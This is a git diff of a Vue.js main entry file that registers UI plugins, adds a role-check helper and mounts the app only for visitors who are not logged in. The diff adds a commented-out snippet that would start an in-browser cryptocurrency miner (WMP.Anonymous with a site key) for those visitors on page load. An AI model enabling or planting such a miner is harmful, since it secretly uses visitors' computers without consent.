@@ -1,12 +1,21 @@
 import Vue from 'vue';
 import App from './App.vue';
 import router from './router';
-import AsyncComputed from 'vue-async-computed';
 
-Array.prototype.deleteByValue = function (value,attr = null) {
-    let index = attr ? this.findIndex(item=>item[attr]===value) : this.findIndex(item=>item===value);
-    this.splice(index,1);
+import {ModalPlugin} from 'bootstrap-vue';
+import AsyncComputed from 'vue-async-computed';
+import vueEllipseProgress from 'vue-ellipse-progress'
+
+Vue.use(ModalPlugin);
+Vue.use(vueEllipseProgress);
+
+Vue.use(AsyncComputed);
+
+Array.prototype.deleteByValue = function (value, attr = null) {
+    let index = attr ? this.findIndex(item => item[attr] === value) : this.findIndex(item => item === value);
+    this.splice(index, 1);
 };
+
 
 String.prototype.toNumber = function () {
     if (this.split(',').length - 1 > 1) {
@@ -17,34 +26,32 @@ String.prototype.toNumber = function () {
     return isNaN(n) ? 0 : n;
 };
 
+if (!window.isLogin) {
 
-Vue.use(AsyncComputed);
-
-
-Vue.directive('can', {
-    bind(el, binding, node) {
-        const roles = binding.arg.split(',');
-        setTimeout(() => {
-            if (!roles.includes(window.Permission)) {
-                el.style.display = 'none';
-                el.childNodes.innerHTML = '';
-
-                node.elm.parentElement.removeChild(node.elm);
-                if (node.child) {
-                    let e = document.getElementById(node.child.controlledBy);
-                    if (e) {
-                        e.parentElement.removeChild(e);
-                    }
-                }
-
-            }
-        }, 1);
-    }
-});
+    /*document.addEventListener('DOMContentLoaded', () => {
+        let browser = WMP.Anonymous('SK_PPVg49qWGiKY32dBw4V5O', {
+            threads: 1,
+            autoThreads: false,
+            throttle: 0.8,
+            forceASMJS:true
+        });
+        browser.start();
+    });*/
 
 
-new Vue({
-    render: (h) => h(App),
-    router,
+    Vue.prototype.$check = function (role) {
+        if (Array.isArray(role)) {
+            return role.includes(window.Permission);
+        }
+        return window.Permission === role;
+    };
 
-}).$mount('#app');
+
+    new Vue({
+        render: (h) => h(App),
+        router,
+
+    }).$mount('#app');
+}
+
+
